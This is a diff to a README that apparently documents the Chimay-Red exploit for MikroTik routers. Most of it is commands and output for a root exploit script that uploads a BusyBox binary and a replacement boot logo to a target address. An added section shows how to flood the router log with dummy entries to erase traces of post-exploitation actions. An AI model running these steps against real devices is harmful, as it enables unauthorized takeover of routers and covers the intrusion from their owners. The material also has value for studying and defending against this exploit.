@@ -132,7 +132,7 @@ Got root ;-)
 To upload `busybox-mips` in `/ram/busybox`  
 ```
 $ wget https://busybox.net/downloads/binaries/1.28.1-defconfig-multiarch/busybox-mips  
-$ ./StackClash_resock_mips.py 192.168.8.1 80 www_mipsbe busybox-mips /ram/busybox   
+$ ./StackClash_resock_mips.py 192.168.8.1 80 www_binary busybox-mips /ram/busybox   
 [...]   
 Uploading busybox-mips in /ram/busybox...   
 Upload done!
@@ -144,6 +144,30 @@ chmod 777 /ram/busybox
 /ram/busybox
 BusyBox v1.28.1 (2018-02-15 14:34:02 CET) multi-call binary.
 [...]
+```
+
+### Change boot logo
+Only RGB Bitmap 24 bit (not compressed) files are supported.  
+Max size: 160px width, 76px height  
+You can find a sample [here](docs/logo.bmp)  
+```
+$ ./StackClash_resock_mips.py 192.168.8.1 80 www_binary docs/logo.bmp /flash/boot/logo.bmp  
+[...]
+Uploading docs/logo.bmp in /flash/boot/logo.bmp...
+Upload done!
+sh: turning off NDELAY mode
+
+Got root ;-)
+
+reboot
+*** Connection closed by remote host ***
+```
+![image](https://github.com/BigNerd95/Chimay-Red/raw/master/docs/boot_image.jpg)
+
+### Hide logs
+To remove logs after your post exploitation actions
+```
+/ # /nova/bin/info ":for i from=1 to=1000 do={ :log info message='Some dummy info' }"
 ```
 
 # FAQ
